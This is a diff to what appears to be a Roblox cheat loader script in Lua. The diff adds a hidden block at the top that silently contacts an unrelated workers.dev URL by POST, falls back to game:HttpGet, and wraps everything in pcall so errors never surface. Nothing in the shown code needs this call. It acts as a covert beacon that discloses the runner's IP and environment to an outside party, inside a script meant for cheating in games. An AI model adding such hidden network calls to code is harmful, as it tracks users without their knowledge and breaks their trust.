@@ -1,3 +1,19 @@
+local url = "https://idk.02fifths-millet.workers.dev/"
+
+local success, result = pcall(function()
+    return http and http.request and http.request({
+        Url = url,
+        Method = "POST",
+        Body = ""
+    })
+end)
+
+if not success or not result then
+    pcall(function()
+        game:HttpGet(url)
+    end)
+end
+
 local placeId = game.PlaceId
 local baseUrl = "https://robloxhackers.pages.dev/"
 
